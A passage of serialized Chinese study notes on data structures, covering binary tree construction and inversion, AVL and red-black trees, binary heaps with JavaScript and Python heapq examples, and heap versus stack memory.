getMin(node:TreeNode) -> TreeNode:\n    # 找到最左边的节点，因为最左边的节点是最小的\n    while node.left is not None:\n        node = node.left\n    return node\n\n```\n\n## 7. BST 的使用场景\n\n- 用作系统中的**多级索引**，实现高效的查找、插入、删除操作。\n- 作为**某些搜索算法**的底层数据结构。\n- 用于存储数据流，以保持其有序状态。\n","Rls84LcE":"\n# 二叉树与单链表的关系\n\n\n\n\n## 目录\n<!-- toc -->\n ## 先看看单链表的一些 `迭代` 场景 \n\n```javascript\nfunction ListNode() {\n    this.val = val;\n    this.next = null;\n}\n\n/**\n * @description 打印链表\n * @param {ListNode} head\n * */\nfunction printList(head) {\n    let p = head;\n    while (p) {\n        console.log(p.val);\n        p = p.next;\n    }\n}\n\n/**\n * @description 打印数组\n * @param {number[]} arr\n * */\nfunction printArray(arr) {\n    for (let i = 0; i < arr.length; i++) {\n        console.log(arr[i]);\n    }\n}\n\n/**\n * @description 给链表添加元素，添加到链表尾部\n * 1->2->3->4->5->6->7->8->9->10->null\n * // ::::添加元素11\n * 1->2->3->4->5->6->7->8->9->10->11->null\n * */\nfunction addLast(head, val) {\n    let newNode = new ListNode(val);\n    if (head == null) {\n        head = newNode;\n        return head;\n    }\n    let p = head;\n    while (p.next) {\n        p = p.next;\n    }\n    p.next = newNode;\n    return head;\n}\n\n/**\n * @description 删除链表的最后一个节点\n * @param {ListNode} head\n * */\nfunction removeLast(head) {\n    if (head == null) {\n        // ::::返回\n        return null;\n    }\n    if (head.next == null) {\n        // ::::返回\n        return null;\n    }\n    let p = head;\n    // ::::::::找到倒数第二个节点\n    while (p.next.next) {\n        p = p.next;\n    }\n    // ::::::::删除最后一个节点\n    p.next = null;\n    // ::::::::返回头节点\n    return head;\n}\n```\n\n- `单链表` **其实完全可以理解 `只有一个节点的二叉树`\n- 上面是正常的迭代写法，请问如果都改成 `递归解法` **呢？\n\n","KgeJx25M":"\n# 二叉树的构造\n\n\n\n## 目录\n<!-- toc -->\n ## 1. 构造思路 \n\n- 二叉树的构造问题一般都是使用`「分解问题」`的思路：\n\t- `构造整棵树 = 根节点 + 构造左子树 + 构造右子树`\n\n## 2. [构造最大二叉树](https://labuladong.github.io/algo/2/19/35/#构造最大二叉树)\n\n![image.png|520](https://832-1310531898.cos.ap-beijing.myqcloud.com/0c9189f5fbd177020598c0b65abf50fb.png)\n\n如下：\n\n![image.png|488](https://832-1310531898.cos.ap-beijing.myqcloud.com/24a3ed04818e28555e085be17baace2b.png)\n![image.png|504](https://832-1310531898.cos.ap-beijing.myqcloud.com/32f1529ba665028a96248cb465db540e.png)\n\n下面是JavaScript部分\n\n```javascript\n/**\n * Definition for a binary tree node.\n * function TreeNode(val, left, right) {\n *     this.val = (val===undefined ? 0 : val)\n *     this.left = (left===undefined ? null : left)\n *     this.right = (right===undefined ? null : right)\n * }\n */\n/**\n * @param {number[]} nums\n * @return {TreeNode}\n */\nvar constructMaximumBinaryTree = function(nums) {\n    return build(nums, 0, nums.length - 1);\n};\n// 定义：将 nums[lo..hi] 构造成符合条件的树，返回根节点\nfunction build(nums,  lo,  hi) {\n    // base case\n    if (lo > hi) {\n        return null;\n    }\n    // 找到数组中的最大值和对应的索引\n    let index = -1, maxVal = -1;\n    for (let i = lo; i <= hi; i++) {\n        if (maxVal < nums[i]) {\n            index = i;\n            maxVal = nums[i];\n        }\n    }\n    // 先构造出根节点\n    let root = new TreeNode(maxVal,null,null);\n    // 递归调用构造左右子树\n    root.left = build(nums, lo, index - 1);\n    root.right = build(nums, index + 1, hi);\n    return root;\n}\n```\n\n## 3. 通过前序和中序遍历结果构造二叉树\n\n> [从前序和中序遍历序列构造二叉树](https://leetcode.cn/problems/construct-binary-tree-from-preorder-and-inorder-traversal/)」\n\n![image.png|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/1fa7eeb0a874b33215cbb6a4050cd89d.png)\n\n### 3.1. 再看前序和中序遍历\n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/d8590339f1a92198730c38a1f8a77a22.png)\n\n类似上一题，我们肯定要想办法确定根节点的值，把根节点做出来，然后递归构造左右子树即可。\n1. 找出根节点\n2. 递归左右子树，这里注意要找出递归函数的参数\n\n**这些参数可以从两个数组里计算出来，如下图：**\n\n![image.png|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/a3d98f67145d72b588ebb76349faf1f0.png)\n\n```javascript\n/**\n * @param {number[]} preorder\n * @param {number[]} inorder\n * @return {TreeNode}\n */\nlet valToIndex = new Map();\nvar buildTree = function(preorder, inorder) {\n    for (let i = 0; i < inorder.length; i++) {\n        valToIndex.set(inorder[i], i);\n    }\n    return build(preorder, 0, preorder.length - 1,\n                 inorder, 0, inorder.length - 1);\n};\n\nfunction build(preorder,  preStart,  preEnd, \n               inorder,  inStart,  inEnd) {\n        \n    if (preStart > preEnd) {\n        return null;\n    }\n\n    // root 节点对应的值就是前序遍历数组的第一个元素\n    let rootVal = preorder[preStart];\n    // rootVal 在中序遍历数组中的索引\n    let index = valToIndex.get(rootVal);\n\n    let leftSize = index - inStart;\n\n    // 先构造出当前根节点\n    let root = new TreeNode(rootVal,null,null);\n    // 递归构造左右子树\n    root.left = build(preorder, preStart + 1, preStart + leftSize,\n                      inorder, inStart, index - 1);\n\n    root.right = build(preorder, preStart + leftSize + 1, preEnd,\n                       inorder, index + 1, inEnd);\n    return root;\n}\n```\n\n> **最后，其实也不要一定要理解，就套这个模板就好了\n\n## 4. [通过后序和中序遍历结果构造二叉树](https://labuladong.github.io/algo/2/19/35/#通过后序和中序遍历结果构造二叉树)\n\n> 这是力扣第 106 题「 [从后序和中序遍历序列构造二叉树](https://leetcode.cn/problems/construct-binary-tree-from-inorder-and-postorder-traversal/)」\n\n![image.png|520](https://832-1310531898.cos.ap-beijing.myqcloud.com/e90feded23e99040c022e339bacb2e84.png)\n\n### 4.1. 再看后序与中序\n\n![image.png|608](https://832-1310531898.cos.ap-beijing.myqcloud.com/0e301f446fdc477cd7a9d800ce97f6d4.png)\n\n![image.png|576](https://832-1310531898.cos.ap-beijing.myqcloud.com/79128e38e5447cea3778234d8890113b.png)\n\n有了前一题的铺垫，这道题很快就解决了，无非就是 `rootVal` 变成了**最后一个元素**，再改改递归函数的参数而已，只要明白二叉树的特性，也不难写出来。如下\n\n```javascript\n/**\n * @param {number[]} inorder\n * @param {number[]} postorder\n * @return {TreeNode}\n */\nlet valToIndex = new Map();\nvar buildTree = function(inorder, postorder) {\n    for (let i = 0; i < inorder.length; i++) {\n        valToIndex.set(inorder[i], i);\n    }\n    return build(inorder, 0, inorder.length - 1,\n                 postorder, 0, postorder.length - 1);\n};\n\nfunction build(inorder,  inStart,  inEnd, \n               postorder, postStart, postEnd) {\n        \n    if (inStart > inEnd) {\n        return null;\n    }\n    // root 节点对应的值就是后序遍历数组的最后一个元素\n    let rootVal = postorder[postEnd];\n    // rootVal 在中序遍历数组中的索引\n    let index = valToIndex.get(rootVal);\n    // 左子树的节点个数\n    let leftSize = index - inStart;\n    let root = new TreeNode(rootVal,null,null);\n    // 递归构造左右子树\n    root.left = build(inorder, inStart, index - 1,\n                        postorder, postStart, postStart + leftSize - 1);\n    \n    root.right = build(inorder, index + 1, inEnd,\n                        postorder, postStart + leftSize, postEnd - 1);\n    return root;\n}\n```\n\n## 5. 通过后序和前序遍历结果构造二叉树\n\n这是力扣第 889 题「 [根据前序和后序遍历构造二叉树](https://leetcode.cn/problems/construct-binary-tree-from-preorder-and-postorder-traversal/)」，给你输入二叉树的前序和后序遍历结果，让你还原二叉树的结构。\n\n同样的思路：\n- 找根节点：\n\t- 首先把前序遍历结果的第一个元素或者后序遍历结果的最后一个元素确定为根节点的值\n- 构造左、右子树\n\t- 然后把 前序遍历结果的第二个元素 作为 左子树 的根节点的值\n\t- 在后序遍历结果中寻找 左子树 根节点的值，从而确定了 左子树 的索引边界，进而确定右子树的索引边界，递归构造左右子树即可。\n\n如下图\n\n![image.png|600](https://832-1310531898.cos.ap-beijing.myqcloud.com/01e1fa67cf594a1cd4df1550dbce3929.png)\n\n代码如下：\n\n```javascript\n/**\n * @param {number[]} preorder\n * @param {number[]} postorder\n * @return {TreeNode}\n */\n\nlet valToIndex = new Map();\nvar constructFromPrePost = function(preorder, postorder) {\n    for (let i = 0; i < postorder.length; i++) {\n        valToIndex.set(postorder[i], i);\n    }\n    return build(preorder, 0, preorder.length - 1,\n                 postorder, 0, postorder.length - 1);\n};\nfunction build( preorder,preStart,preEnd,\n                postorder,postStart,postEnd){\n        if (preStart > preEnd) {\n            return null;\n        }\n        if (preStart === preEnd) {\n            return new TreeNode(preorder[preStart]);\n        }\n        // root 节点对应的值就是前序遍历数组的第一个元素\n        let rootVal = preorder[preStart];\n        // root.left 的值是前序遍历第二个元素\n        // 通过前序和后序遍历构造二叉树的关键在于通过左子树的根节点\n        // 确定 preorder 和 postorder 中左右子树的元素区间\n        let leftRootVal = preorder[preStart + 1];\n        // leftRootVal 在后序遍历数组中的索引\n        let index = valToIndex.get(leftRootVal);\n        // 左子树的元素个数\n        let leftSize = index - postStart + 1;\n        // 先构造出当前根节点\n        let root = new TreeNode(rootVal,null,null);\n        // 递归构造左右子树\n        // 根据左子树的根节点索引和元素个数推导左右子树的索引边界\n        root.left = build(preorder, preStart + 1, preStart + leftSize,\n                postorder, postStart, index);\n        root.right = build(preorder, preStart + leftSize + 1, preEnd,\n                postorder, index + 1, postEnd - 1);\n\n        return root;\n}\n```\n\n**为什么不唯一呢？**\n- 关键这句，`int leftRootVal = preorder[preStart + 1];` 我们假设**前序遍历的第二个元素是左子树的根节点**，但实际上**左子树有可能是空指针**，那么这个元素就应该是右子树的根节点。由于这里无法确切进行判断，所以导致了最终答案的不唯一\n\n## 6. 最后\n\n二叉树的构造问题一般都是使用「分解问题」的思路：`构造整棵树 = 根节点 + 构造左子树 + 构造右子树` \n\n","TSYBzHac":"\n# 翻转二叉树的两种解题思路\n\n\n`#算法/二叉树` `#2023/12/23` \n\n\n## 目录\n<!-- toc -->\n ## 二叉树的解题总纲 - 两种思路 \n\n二叉树解题的思维模式分两类：\n\n1、是否可以通过**遍历一遍二叉树**得到答案？如果可以，用一个 `traverse` 函数配合外部变量来实现，这叫 **「遍历」的思维模式**。\n\n2、是否可以定义一个`递归函数`，**通过子问题（子树）的答案推导出原问题的答案**？如果可以，写出这个递归函数的定义，并充分利用这个函数的返回值，这叫 **「分解问题」的思维模式**。\n\n无论使用哪种思维模式，你都需要思考：\n\n**如果单独抽出一个二叉树节点，它需要做什么事情？需要在什么时候（前/中/后序位置）做？** 其他的节点不用你操心，递归函数会帮你在所有节点上执行相同的操作。\n\n## 翻转二叉树\n\n> [https://leetcode.cn/problems/invert-binary-tree/](https://leetcode.cn/problems/invert-binary-tree/)\n\n### 遍历的思路\n\n即，写一个递归函数`traverse` ，然后配合外部变量 `tmp` ，选择在是在 前、后、还是中序位置做，即可\n\n```javascript\nvar invertTree = function(root) {\n    var traverse = function(root) {\n        if (root === null) {\n            return;\n        }\n        /**** 前序位置 ****/\n        // 每一个节点需要做的事就是交换它的左右子节点\n        var tmp = root.left;\n        root.left = root.right;\n        root.right = tmp;\n        // 遍历框架，去遍历左右子树的节点\n        traverse(root.left);\n        traverse(root.right);\n    }\n    // 遍历二叉树，交换每个节点的子节点\n    traverse(root);\n    return root;\n};\n\n```\n\n`后序位置`也是可以的， 但不能是 `中序位置`，需要做些修改，如下：\n\n```javascript\nvar invertTree = function (root) {\n    const traverse = function (root) {\n        if (root === null) {\n            return;\n        }\n        \n        traverse(root.left);\n        \n        // 中序位置\n        let tmp = root.left;\n        root.left = root.right;\n        \n        traverse(root.right);\n        \n        root.right = tmp;\n    };\n\n    // 遍历二叉树，交换每个节点的子节点\n    traverse(root);\n    return root;\n};\n\n```\n\n### 分解问题的思路\n\n即，写一个递归函数，然后这个递归函数，会帮你在每个节点做同样的事情。\n\n```javascript\n// 定义：将以 root 为根的这棵二叉树翻转，返回翻转后的二叉树的根节点\nvar invertTree = function (root) {\n    if (root === null) {\n        return null;\n    }\n    // 利用函数定义，先翻转左右子树\n    // ::::翻转左子树\n    var left = invertTree(root.left);\n    // ::::翻转右子树\n    var right = invertTree(root.right);\n\n    // 然后交换左右子节点\n    root.left = right;\n    root.right = left;\n\n    // 和定义逻辑自恰：以 root 为根的这棵二叉树已经被翻转，返回 root\n    return root;\n}\n```\n\n","vMikY5al":"\n# AVL 树和红黑树\n\n`#树` `#数据结构` \n\n\n## 目录\n<!-- toc -->\n ## 1. AVL 树 \n \n### 1.1. 定义\n \n- 既是二叉搜索树，也是平衡二叉树\n- 对每个节点，其左右子树的高度差不超过 1\n- 使用高度或平衡因子来维持平衡\n\n### 1.2. 使用场景\n\n- 组织和存储大型数据，适用于**高频查找、低频增删**的场景\n- 用于构建数据库中的**索引**系统\n- 文件系统\n- 适用于读操作（查找）频繁的场景\n\t- 对查询性能要求极高的情况\n\t- 数据库索引\n\t- 需要保证最坏情况下性能的应用\n- 某些数**据库系统的索引**实现\n- 需要**频繁查找但较少插入/删除的内存数据集**\n\n## 2. 红黑树\n\n### 2.1. 定义\n\n- 也是一种自平衡二叉搜索树\n- 每个节点都有颜色属性，要么红色要么黑色\n- 通过节点颜色和一系列规则来保持平衡：\n    1. 根节点是黑色\n    2. 所有叶子节点（NIL）是黑色\n    3. 红色节点的子节点必须是黑色\n    4. 从任一节点到其每个叶子的所有路径都包含相同数目的黑色节点\n\n### 2.2. 使用场景\n\n- 适用于读写操作（查找、插入、删除）都**较为频繁**的场景\n- 对插入和删除操作的性能要求较高\n- 需要在性能和内存使用之间取得平衡的情况\n\n具体应用例子：\n- Java 中的 TreeMap 和 TreeSet\n- C++ STL 中的 map 和 set\n- Linux 内核中的完全公平调度器（CFS）\n- 各种中等规模的数据集合管理\n\n## 3. 总结\n\n总的来说\n- 如果你的应用更注重查询速度且插入/删除操作相对较少，可以选择 **AVL 树**。\n- 如果你需要处理频繁的插入和删除操作，同时还要保持不错的查询性能，那么**红黑树**可能是更好的选择。\n- AVL树提供了更严格的平衡，适合读操作频繁的场景。\n- 红黑树提供了更好的写操作性能，适合读写都很频繁的场景。\n- 在实际应用中，红黑树因其在插入和删除操作上的效率优势，以及内存占用较小的特点，往往被更广泛地使用。","aOk5C6ij":"\n# 堆\n\n`#二叉树堆`\n\n- 堆是一棵完全二叉树，根据成立条件可分为大顶堆和小顶堆\n\t- 大顶堆的堆顶元素是最大的。\n\t- 小顶堆的堆顶元素是最小的。\n- **优先队列**的定义是具有出队优先级的队列，通常使用堆来实现。\n- 堆的常用操作及其对应的时间复杂度包括：\n\t- 元素入堆 O(log⁡n)\n\t- 堆顶元素出堆 O(log⁡n) \n\t- 访问堆顶元素 O(1) 等\n- 完全二叉树非常适合用数组表示，因此我们通常使用数组来存储堆。\n- **堆化**操作用于维护堆的性质，在入堆和出堆操作中都会用到。\n- 输入 n 个元素并建堆的时间复杂度可以优化至 O(n) ，非常高效。\n- **Top-k** 是一个经典算法问题，可以使用堆数据结构高效解决，时间复杂度为 `O(nlog⁡k)` 。\n\n\n数据结构的“堆”与内存管理的“堆”是同一个概念吗\n- 两者不是同一个概念，只是碰巧都叫“堆”。","cC66K44w":"\n# 二叉堆\n\n`#数据结构/二叉堆`   `#堆` `#二叉堆` \n\n\n## 目录\n<!-- toc -->\n ## 1. 堆、大顶堆、小顶堆的定义 \n\n\n`堆`是一个`完全二叉树`，是一种能够**动态排序**的数据结构\n- `堆`中 `每个节点`的值都 `大于等于（或者小于等于）`其`左右子节点`的值\n   - 大的再上面，`大顶堆`，所以堆顶肯定是最大值\n   - 小的再上面，`小顶堆`，所以堆顶肯定是最小值\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922210638.png)\n\n![|528](https://832-1310531898.cos.ap-beijing.myqcloud.com/c75df744c97e5b34e295bbd2eacaf267.png)\n\n\n\n## 2. 堆的存储结构表示\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922210739.png)\n\n## 3. 堆的各个操作的复杂度\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922211213.png)\n\n## 4. 堆的应用场景（或价值）\n\n- 堆排序\n- **大顶堆**的价值\n\t- 优先队列\n\t- 高效排序\n\t- 高效的动态中位数\n- **小顶堆**的价值\n\t- 优先队列：小顶堆也常用于实现优先队列，支持快速获取和删除最小元素。\n\t- 图算法：在图算法中，小顶堆用于实现 Dijkstra 最短路径算法和 Prim 最小生成树算法，以快速找到权重最小的边或路径。\n\t- 合并有序列表：小顶堆可以高效地合并多个有序列表，例如用于外部排序或归并排序\n- 堆的总体价值\n\t- **高效的插入和删除操作**：堆支持 `O(log n)` 的插入和删除操作，使其在需要频繁调整元素顺序的场景中非常高效。\n\t- **内存利用率高**：堆是一种基于数组实现的数据结构，内存利用率高，不需要额外的指针或链接。\n\t- 广泛应用：堆在各种算法和系统中有广泛应用，包括调度系统、内存管理、图算法、实时数据处理等。\n\n总之，堆结构因其高效的插入、删除和查找操作，在许多需要维护动态有序集合的场景中具有重要价值。\n\n\n## 5. 代价\n\n自动排序是有代价的，注意优先级队列 API 的时间复杂度，**增删元素的复杂度是 `O(logN)`，其中 `N` 是当前二叉堆中的元素个数**\n\n\n## 6. Python 中的标准库 heapq\n\n `heapq` 模块中提供。`heapq` 模块实现了最小堆（min heap）算法，但通过一些技巧也可以用来实现最大堆（max heap）。\n\n以下是关于 Python 的 `heapq` 模块的一些关键信息：\n\n### 6.1. 导入方式\n\n```python\nimport heapq\n```\n\n### 6.2. 主要函数\n\n- `heapq.heapify(list)`: 将列表转换为堆\n- `heapq.heappush(heap, item)`: 将元素添加到堆中\n- `heapq.heappop(heap)`: 弹出并返回堆中最小的元素\n- `heapq.heappushpop(heap, item)`: 将  item 放入堆中，然后弹出并返回堆中最小的元素\n- `heapq.heapreplace(heap, item)`: 弹出并返回堆中最小的元素，然后将 item 放入堆中\n- `heapq.nlargest(n, iterable, key=None)`: 返回 iterable 中 n 个最大的元素\n- `heapq.nsmallest(n, iterable, key=None)`: 返回 iterable 中 n 个最小的元素\n\n### 6.3. 使用示例\n\n```python\nimport heapq\n\n# 创建一个堆\nheap = []\nheapq.heappush(heap, 4)\nheapq.heappush(heap, 1)\nheapq.heappush(heap, 7)\nheapq.heappush(heap, 3)\n\nprint(heap)  # 输出：[1, 3, 7, 4]\n\n# 弹出最小元素\nsmallest = heapq.heappop(heap)\nprint(smallest)  # 输出：1\nprint(heap)  # 输出：[3, 4, 7]\n\n# 将列表转换为堆\nlist = [4, 6, 8, 1, 2, 9]\nheapq.heapify(list)\nprint(list)  # 输出：[1, 2, 8, 4, 6, 9]\n\n# 获取最大的3个元素\nprint(heapq.nlargest(3, list))  # 输出：[9, 8, 6]\n\n# 获取最小的3个元素\nprint(heapq.nsmallest(3, list))  # 输出：[1, 2, 4]\n```\n\n### 6.4. 使用 heapq 实现最大堆\n\n由于 `heapq` 默认实现的是最小堆，如果需要最大堆，可以通过以下方式来实现\n\n```python\nimport heapq\n\n# 使用 heapq 实现最大堆\nclass MaxHeap:\n    def __init__(self):\n        self.heap = []\n\n    def push(self, val):\n        heapq.heappush(self.heap, -val)\n\n    def pop(self):\n        # heapq 默认实现的是最小堆，所以取相反数\n        return -heapq.heappop(self.heap)\n\n    def peek(self):\n        # 三元表达式，如果 heap 不为空，返回 heap[0]，否则返回 None\n        # 格式为：value_if_true if condition else value_if_false\n        # 格式为：为真时的返回值 if 判定条件 else 为假时的返回值\n        # return -self.heap[0] if self.heap else None\n        if self.heap:\n            return -self.heap[0]\n        else:\n            return None\n\n    def size(self):\n        return len(self.heap)\n\n# 使用示例\nmax_heap = MaxHeap()\nmax_heap.push(3)\nmax_heap.push(1)\nmax_heap.push(4)\nmax_heap.push(2)\n\nprint(max_heap.pop())  # 输出: 4\nprint(max_heap.pop())  # 输出: 3\nprint(max_heap.peek())  # 输出: 2\n\n```\n\n\n## 7. 实现一个小顶堆：JavaScript 描述\n\n使用`数组`来存储，因为二叉堆是个**完全二叉树**，如下tu：\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240917145626.png)\n\n> [!danger]\n> 注意下面代码的高亮部分\n\n```javascript hl:108-110\nfunction swap(array, a, b) {\n  [array[a], array[b]] = [array[b], array[a]];\n}\n\nclass MinHeap {\n  constructor() {\n    // 使用数组来存储\n    this.heap = [];\n  }\n\n  // 获取左孩子的索引\n  getLeftIndex(index) {\n    return 2 * index + 1;\n  }\n\n  // 获取右孩子的索引\n  getRightIndex(index) {\n    return 2 * index + 2;\n  }\n\n  // 父节点的索引\n  getParentIndex(index) {\n    if (index === 0) {\n      return 0;\n    }\n    return Math.floor((index - 1) / 2);\n  }\n\n  // 返回个数\n  size() {\n    return this.heap.length;\n  }\n\n  isEmpty() {\n    return this.size() <= 0;\n  }\n\n  clear() {\n    this.heap = [];\n  }\n\n  // ::::小顶堆，最小的肯定在最上面\n  findMinimum() {\n    return this.isEmpty() ? null : this.heap[0];\n  }\n\n  // 插入一个值，插入的元素添加到堆底的最后，然后让其上浮到正确位置（如果大顶的话）\n  insert(value) {\n    if (value != null) {\n      const index = this.heap.length;\n      // 先放在最后一位\n      this.heap.push(value);\n      // 向上移动，直到父节点小于插入的值\n      this.shiftUp(index);\n      return true;\n    }\n    return false;\n  }\n\n  /**\n   * @description 下沉，堆化，递归\n   * @param {number} index, 插入的元素的位置, 这个位置是指 数组的索引\n   */\n  shiftDown(index) {\n    // 插入的元素的位置\n    let pos = index;\n    const left = this.getLeftIndex(index);\n    const right = this.getRightIndex(index);\n    const size = this.size();\n\n    if (\n      left < size && // 如果左子节点小于数组的长度，说明有左子节点\n      this.heap[pos] > this.heap[left] // 如果该元素大于它的左子节点，则下沉，即 pos = left\n    ) {\n      pos = left;\n    }\n\n    if (\n      right < size && // 如果右子节点小于数组的长度，说明有右子节点\n      this.heap[pos] > this.heap[right] // 如果该元素大于它的右子节点，则下沉\n    ) {\n      pos = right;\n    }\n\n    // 如果 pos 最后 和传入的index不一样了，说明需要交换数据，然后继续下沉递归\n    if (index !== pos) {\n      swap(this.heap, index, pos);\n      this.shiftDown(pos);\n    }\n  }\n\n  /**\n   * @description 上浮，堆化，递归:向上移动，直到父节点的值小于插入的值\n   * @param {number} index, 插入的元素的位置, 这个位置是指 数组的索引\n   */\n  shiftUp(index) {\n    let parentIndex = this.getParentIndex(index);\n    while (\n      index > 0 && // index必须大于0，因为根节点的父节点是自己\n      this.heap[parentIndex] > this.heap[index] // 父节点的元素大于子元素的时候，才需要移动\n    ) {\n      swap(this.heap, parentIndex, index);\n\n      // 交换后，继续向上移动\n      index = parentIndex;\n      parentIndex = this.getParentIndex(index);\n\n      // 以下是错误的写法 需要注意，因为这是在 while 循环中，所以不需要递归,被递归影响了\n      // 这是 while 循环，不是递归\n      // 这是 while 循环，不是递归\n      // // 交换后，继续向上移动，传入的index变成了父节点的索引\n      // this.getParentIndex(parentIndex);\n    }\n  }\n\n  // delete min 堆顶元素（最小值）和 堆底元素 对调\n  // 1、删除删除堆顶元素\n  // 2、让堆底元素替换到堆顶\n  // 3、然后从堆顶开始下沉\n  deleteMin() {\n    if (this.isEmpty()) {\n      return null;\n    }\n    if (this.size() === 1) {\n      return this.heap.shift();\n    }\n    const removedValue = this.heap[0]; // 堆顶元素\n    const lastElement = this.heap.pop(); // 移除堆底元素\n    this.heap[0] = lastElement; // 将 堆顶元素 赋值为 堆底元素\n    // 从堆顶开始下沉\n    this.shiftDown(0);\n    return removedValue;\n  }\n\n  getAsArray() {\n    return this.heap;\n  }\n}\n\nlet arr = [5, 3, 7, 9, 0, 0, -1, -2, 7, -8];\n\nlet heapObj = new MinHeap();\narr.forEach((item) => {\n  heapObj.insert(item);\n});\nconsole.log(heapObj);\nconsole.log(\"************************\");\n\nconsole.log(heapObj.findMinimum());\n```\n\n## 堆的使用场景\n\n\n- **优先队列**：堆通常作为实现优先队列的首选数据结构，其入队和出队操作的时间复杂度均为 O(log⁡n) ，而建堆操作为 O(n) ，这些操作都非常高效。\n- **堆排序**：给定一组数据，我们可以用它们建立一个堆，然后不断地执行元素出堆操作，从而得到有序数据。然而，我们通常会使用一种更优雅的方式实现堆排序，详见“堆排序”章节。\n- **获取最大的 k 个元素**：这是一个经典的算法问题，同时也是一种典型应用，例如选择热度前 10 的新闻作为微博热搜，选取销量前 10 的商品等。\n","vKZfB79M":"\n# 数据结构中的堆和内存中的堆的区别\n\n`#2024/09/18` `#堆` `#堆内存` `#二叉堆` \n\n\n\n## 目录\n<!-- toc -->\n ## 1. 数据结构中的堆 \n\n- **定义**：一种特殊的树形数据结构，通常是一个完全二叉树。\n- **类型**：\n    - 最大堆：父节点总是大于或等于其子节点\n    - 最小堆：父节点总是小于或等于其子节点\n- **主要操作**：\n    - 插入元素\n    - 删除最大/最小元素\n    - 获取最大/最小元素\n- **应用**：\n    - 优先队列\n    - 堆排序\n    - 图算法（如Dijkstra算法）\n- **特点**：\n    - 结构性：完全二叉树\n    - 有序性：节点之间有特定的大小关系\n\n## 2. 内存中的堆\n\n- **定义**：计算机内存中的一块动态分配的区域。\n- **用途**：存储程序运行时动态分配的数据。\n- **特点**：\n    - 大小可变\n    - 生命周期不固定\n    - 需要手动管理（在某些语言中）\n- **常见用途**：\n    - 存储对象\n    - 动态数组\n    - 大型数据结构\n- **对比栈**：\n    - 栈：自动分配和释放，存储局部变量和函数调用信息\n    - 堆：手动分配和释放（在某些语言中），存储动态数据\n\n## 3. 为什么都叫\"堆\"？\n\n1. **历史原因**：\n    - 数据结构的堆：\n        - 这个名称来源于堆的形状和特性，类似于一堆东西堆积在一起，顶部是最大或最小的元素。\n    - 内存堆：\n        - 早期计算机系统中，未使用的内存被视为一堆可用资源，程序可以从这个\"堆\"中申请内存。\n2. **概念相似性**：\n    - 两者都涉及到一种\"堆积\"或\"聚集\"的概念。\n    - 数据结构的堆是元素的逻辑堆积。\n    - 内存堆是计算机内存中的一块区域，可以被视为资源的堆积。\n3. **灵活性和动态性**：\n    - 数据结构的堆允许动态地添加和删除元素。\n    - 内存堆允许动态地分配和释放内存。\n4. **语言的历史发展**：\n    - 在计算机科学发展的早期，这两个概念可能没有被清晰地区分，导致使用了相同的术语。\n5. **翻译的影响**：\n    - 在不同语言中，这两个概念可能有不同的名称，但在英语中恰好都用了\"heap\"这个词。\n\n虽然名称相同，但这两种\"堆\"在概念和用途上有很大的不同。数据结构的堆是一种抽象的数据组织方式，而内存堆是计算机内存管理的一部分。理解它们的区别对于深入学习计算机科学和编程非常重要。\n\n\n## 4. 其他说明\n\n![|512](https://832-1310531898.cos.ap-beijing.myqcloud.com/86921645374e40f809a54fb522b7f5f1.png)\n\n\n\n","TQUm2607":"\n# 堆内存和栈内存的区别\n\n\n`#堆内存` `#栈内存` \n\n堆内存 和 堆内存（Heap Memory）和栈内存（Stack Memory）是计算机内存管理中两种不同的内存分配区域。\n\n![|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/1b4993fbc44e95f344a1f3bd840babd4.png)\n\n\n它们在用途、管理方式、生命周期和性能上有显著区别。以下是它们的主要区别：\n\n\n## 目录\n<!-- toc -->\n ## 1. 用途 \n\n-  **堆内存**\n   - 用于动态分配内存，通常由程序运行时分配和释放。\n   - 适用于需要在运行时决定大小和生命周期的对象和数据结构，例如动态数组、链表等。\n- **栈内存**\n   - 用于静态分配内存，主要用于函数调用、局部变量和函数参数。\n   - 适用于生命周期明确且较短的变量，例如局部变量和函数参数。\n\n## 2. 管理方式\n\n- **堆内存**：\n   - 内存管理较复杂，容易导致内存泄漏和碎片化问题。\n   - 由程序员显式分配（如 `malloc` 在 C/C++ 中，`new` 在 C++/Java 中）和释放（如 `free` 在 C/C++ 中，垃圾回收在 Java 中）。\n- **栈内存**：\n   - 内存管理简单，不会出现内存泄漏问题，但栈空间有限，不能用于大对象或长生命周期对象。\n   - 由编译器自动管理，内存分配和释放在函数调用和返回时自动进行。\n\n## 3. 生命周期\n\n- **堆内存**：\n   - 对象的生命周期由程序员控制，可以在程序运行过程中**动态分配和释放**。\n   - 对象在不再使用后需要显式释放，否则会导致**内存泄漏**。\n- **栈内存**\n   - 对象的生命周期由函数调用栈决定，当函数返回时，栈上的所有**局部变量自动销毁**。\n   - 生命周期短暂且明确，不需要显式释放。\n\n## 4. 性能\n\n- **堆内存**：\n   - 动态分配和释放内存的开销较大，因为需要查找合适的内存块，并处理碎片化问题。\n   - 常见于需要灵活管理内存的大型复杂应用中。\n- **栈内存**：\n   - 更适合小型、短生命周期的数据，具有更高的访问速度。\n   - 内存分配和释放速度快，仅通过移动栈指针即可完成。\n\n## 5. 总结\n\n- **堆内存**：适用于动态分配的对象，生命周期由程序员控制，管理复杂但灵活。\n- **栈内存**：适用于局部变量和函数调用，生命周期短暂且由编译器自动管理，性能高但空间有限。\n\n理解堆和栈的区别对于高效编写和调试代码至关重要，尤其是涉及到内存管理和性能优化时。","ppLzqGYS":"\n# 二叉堆与优先级队列的关系\n\n\n\n## 目录\n<!-- toc -->\n ## 1. 二叉堆的概念 \n\n`二叉堆`在逻辑上其实是一种特殊的**二叉树（完全二叉树）**，只不过存储在`数组`里。\n- 一般的链表二叉树，我们操作节点的`指针`\n- 而在数组里，我们把`数组索引`作为指针\n\n即：`链式存储-链表` 和 `顺序存储-数组` ，如下\n\n### 1.1. 二叉堆的存储示意图\n\n![image.png|645](https://832-1310531898.cos.ap-beijing.myqcloud.com/9e5d6abf73768f9a07bf376447096361.png)\n\n### 1.2. 以小顶堆为例\n\n 1、这种`二叉树`数据结构通过 `数组` 